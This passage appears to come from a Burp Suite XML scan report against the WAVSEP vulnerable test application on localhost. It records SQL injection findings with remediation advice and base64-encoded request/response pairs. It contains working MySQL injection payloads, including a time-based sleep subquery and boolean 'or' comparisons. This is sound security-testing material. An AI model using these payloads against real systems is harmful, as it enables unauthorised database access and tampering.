MtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2dpZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSk=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjQyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOSAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGFuIHVwZGF0ZSBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpRdWVyeSBleGVjdXRlZAoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4957769988888532992</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-With200Errors.jsp [orderby parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>orderby</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the orderby parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the orderby parameter. The application took <b>20009</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTAtSW5qZWN0aW9uSW5TZWFyY2hPcmRlckJ5LU51bWVyaWMtQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogOQ0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3IvQ2FzZTEwLUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1OdW1lcmljLUJpbmFyeURlbGliZXJhdGVSdW50aW1lRXJyb3ItV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm9yZGVyYnk9MSc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTM4DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjIyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEwIC0gSW5qZWN0aW9uIGludG8gYW4gb3JkZXIgYnkgY2xhdXNlIChudW1lcmljKSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJycnIGF0IGxpbmUgMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTAtSW5qZWN0aW9uSW5TZWFyY2hPcmRlckJ5LU51bWVyaWMtQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogOQ0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3IvQ2FzZTEwLUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1OdW1lcmljLUJpbmFyeURlbGliZXJhdGVSdW50aW1lRXJyb3ItV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm9yZGVyYnk9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEp]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjQyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MzANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEwIC0gSW5qZWN0aW9uIGludG8gYW4gb3JkZXIgYnkgY2xhdXNlIChudW1lcmljKSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5359211732161100800</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-With200Errors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>84438343 or 7905=07905</b> and <b>18747252 or 3660=3667</b> were each submitted in the transactionDate parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionDate parameter. The application took <b>20005</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTUtSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZVdpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3IvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDE4NDQzODM0MyUyMG9yJTIwNzkwNSUzZDA3OTA1]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjAwIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAxMjYyDQoNCgoKCjwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgSFRNTCA0LjAxIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi9odG1sNC9sb29zZS5kdGQiPgo8aHRtbD4KPGhlYWQ+CjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PUlTTy04ODU5LTEiPgo8dGl0bGU+Q2FzZSAxNSAtIEluamVjdGlvbiBpbnRvIGRhdGUgdmFsdWVzICh3aXRob3V0IHF1b3RlcykgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxMzMKPC9URD4KPFREPgoxMjAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KMTM1CjwvVEQ+CjxURD4KMzAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjIyMwo8L1REPgo8VEQ+CjQwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo0MjMKPC9URD4KPFREPgo1MDAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KNDU2CjwvVEQ+CjxURD4KNjAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+Cjc4OQo8L1REPgo8VEQ+CjcwMTIKPC9URD4KPFREPgpFeHBlbnNpdmUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo4OTUKPC9URD4KPFREPgo4MDAwCjwvVEQ+CjxURD4KSGVsbG8gV29ybGQKPC9URD4KPFREPgoyMDEwLTAyLTAyCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTUtSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZVdpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3IvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDExODc0NzI1MiUyMG9yJTIwMzY2MCUzZDM2Njc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjAwIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE1IC0gSW5qZWN0aW9uIGludG8gZGF0ZSB2YWx1ZXMgKHdpdGhvdXQgcXVvdGVzKSBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
